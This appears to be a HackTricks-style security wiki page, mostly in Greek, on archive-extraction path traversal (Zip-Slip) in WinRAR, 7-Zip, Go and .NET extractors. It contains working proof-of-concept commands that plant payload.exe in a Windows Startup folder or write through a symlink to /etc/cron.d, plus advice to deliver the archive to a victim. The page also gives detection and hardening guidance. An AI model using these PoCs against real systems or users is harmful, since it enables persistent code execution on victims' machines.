# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Επισκόπηση

Πολλές μορφές αρχείων συμπίεσης (ZIP, RAR, TAR, 7-ZIP, κ.λπ.) επιτρέπουν σε κάθε εγγραφή να φέρει τη δική της **internal path**. Όταν ένα εργαλείο εξαγωγής αποδέχεται άκριτα αυτή τη διαδρομή, ένα κατασκευασμένο όνομα αρχείου που περιέχει `..` ή μια **absolute path** (π.χ. `C:\Windows\System32\`) θα γραφτεί εκτός του καταλόγου που επέλεξε ο χρήστης. Αυτή η κατηγορία ευπάθειας είναι ευρέως γνωστή ως *Zip-Slip* ή **archive extraction path traversal**.

Οι συνέπειες κυμαίνονται από την επανεγγραφή αυθαίρετων αρχείων έως την άμεση επίτευξη **remote code execution (RCE)** με την απόθεση ενός payload σε μια **auto-run** τοποθεσία όπως ο φάκελος *Startup* των Windows.

## Αιτία

1. Ο επιτιθέμενος δημιουργεί ένα archive όπου ένα ή περισσότερα headers αρχείων περιέχουν:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. Το θύμα εξάγει το archive με ένα ευάλωτο εργαλείο που εμπιστεύεται την ενσωματωμένη διαδρομή (ή ακολουθεί symlinks) αντί να την καθαρίσει ή να αναγκάσει την εξαγωγή κάτω από τον επιλεγμένο κατάλογο.
3. Το αρχείο γράφεται σε τοποθεσία που ελέγχεται από τον επιτιθέμενο και εκτελείται/φορτώνεται την επόμενη φορά που το σύστημα ή ο χρήστης θα ενεργοποιήσει αυτή τη διαδρομή.

### .NET `Path.Combine` + `ZipArchive` traversal

Ένα κοινό anti-pattern στο .NET είναι ο συνδυασμός του προοριζόμενου προορισμού με την **ελεγχόμενη από τον χρήστη** `ZipArchiveEntry.FullName` και η εξαγωγή χωρίς κανονικοποίηση της διαδρομής:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Αν το `entry.FullName` ξεκινά με `..\\` τότε πραγματοποιείται directory traversal· αν είναι ένα **απόλυτο μονοπάτι**, το αριστερό συστατικό απορρίπτεται εντελώς, οδηγώντας σε **αυθαίρετη εγγραφή αρχείου** ως ταυτότητα εξαγωγής.
- Proof-of-concept archive για εγγραφή σε έναν αδελφό κατάλογο `app` που παρακολουθείται από έναν προγραμματισμένο σαρωτή:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Η τοποθέτηση αυτού του ZIP στο παρακολουθούμενο inbox οδηγεί στο `C:\samples\app\0xdf.txt`, αποδεικνύοντας traversal εκτός του `C:\samples\queue\` και επιτρέποντας follow-on primitives (π.χ., DLL hijacks).

## Παράδειγμα Πραγματικού Κόσμου – WinRAR ≤ 7.12 (CVE-2025-8088)

Το WinRAR για Windows (συμπεριλαμβανομένων των `rar` / `unrar` CLI, της DLL και του portable source) απέτυχε να επικυρώσει τα ονόματα αρχείων κατά την εξαγωγή.
Ένα κακόβουλο RAR αρχείο που περιέχει μια εγγραφή όπως:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
θα καταλήξει **εκτός** του επιλεγμένου φακέλου εξόδου και μέσα στο *Startup* φάκελο του χρήστη. Μετά το logon, τα Windows εκτελούν αυτόματα ό,τι υπάρχει εκεί, παρέχοντας *μόνιμο* RCE.

### Δημιουργία PoC αρχείου (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – αποθηκεύει τις διαδρομές αρχείων ακριβώς όπως δίνονται (μην **αφαιρείτε** το αρχικό `./`).

Παραδώστε `evil.rar` στο θύμα και δώστε οδηγίες να το αποσυμπιέσουν με ευάλωτη έκδοση του WinRAR.

### Παρατηρημένη εκμετάλλευση στο πεδίο

Η ESET ανέφερε ότι οι εκστρατείες spear-phishing του RomCom (Storm-0978/UNC2596) επισυνάπταν RAR archives που εκμεταλλεύονταν το CVE-2025-8088 για να αναπτύξουν εξατομικευμένα backdoors και να διευκολύνουν ransomware επιχειρήσεις.

## Νεότερες Περιπτώσεις (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: Εγγραφές ZIP που είναι **symbolic links** απο-αναφερόταν κατά την εξαγωγή, επιτρέποντας σε επιτιθέμενους να ξεφύγουν από τον κατάλογο προορισμού και να αντικαταστήσουν αυθαίρετες διαδρομές. Η αλληλεπίδραση χρήστη είναι απλά το *άνοιγμα/η εξαγωγή* του archive.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Επικαλύπτοντας `Start Menu/Programs/Startup` ή θέσεις που τρέχουν υπηρεσίες → ο κώδικας εκτελείται στο επόμενο logon ή επανεκκίνηση υπηρεσίας.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Σε patched build το `/etc/cron.d` δεν θα τροποποιηθεί· το symlink θα εξαχθεί ως link μέσα σε /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` ακολουθεί `../` και symlinked ZIP entries, γράφοντας έξω από το `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Συμβουλές Ανίχνευσης

* **Static inspection** – Λίστα με τις εγγραφές του archive και επισημάνετε οποιοδήποτε όνομα περιέχει `../`, `..\\`, *absolute paths* (`/`, `C:`) ή εγγραφές τύπου *symlink* των οποίων ο στόχος είναι εκτός του φακέλου εξαγωγής.
* **Canonicalisation** – Βεβαιωθείτε ότι `realpath(join(dest, name))` εξακολουθεί να ξεκινά με `dest`. Απορρίψτε αλλιώς.
* **Sandbox extraction** – Αποσυμπιέστε σε έναν προσωρινό κατάλογο χρησιμοποιώντας έναν *ασφαλή* extractor (π.χ., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) και επαληθεύστε ότι οι προκύπτοντες διαδρομές παραμένουν μέσα στον κατάλογο.
* **Endpoint monitoring** – Ειδοποιήστε για νέα εκτελέσιμα που γράφονται σε `Startup`/`Run`/`cron` τοποθεσίες σύντομα μετά το άνοιγμα ενός archive από WinRAR/7-Zip/etc.

## Αντιμετώπιση & Σκληρυνση

1. **Update the extractor** – WinRAR 7.13+ και 7-Zip 25.00+ εφαρμόζουν sanitisation για paths/symlinks. Και τα δύο εργαλεία εξακολουθούν να μην διαθέτουν auto-update.
2. Εξαγάγετε αρχεία χρησιμοποιώντας “**Do not extract paths**” / “**Ignore paths**” όταν είναι δυνατό.
3. Σε Unix, ρίξτε προνόμια & mount ένα **chroot/namespace** πριν την εξαγωγή· σε Windows, χρησιμοποιήστε **AppContainer** ή sandbox.
4. Εάν γράφετε custom κώδικα, κανονικοποιήστε με `realpath()`/`PathCanonicalize()` **πριν** τη δημιουργία/εγγραφή, και απορρίψτε οποιαδήποτε εγγραφή διαφεύγει από τον προορισμό.

## Επιπρόσθετες Επηρεαζόμενες / Ιστορικές Περιπτώσεις

* 2018 – Μεγάλη συμβουλευτική *Zip-Slip* από Snyk που επηρέασε πολλές Java/Go/JS βιβλιοθήκες.
* 2023 – 7-Zip CVE-2023-4011 παρόμοια traversal κατά το `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Οποιαδήποτε custom λογική εξαγωγής που δεν καλεί `PathCanonicalize` / `realpath` πριν την εγγραφή.

## Αναφορές

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
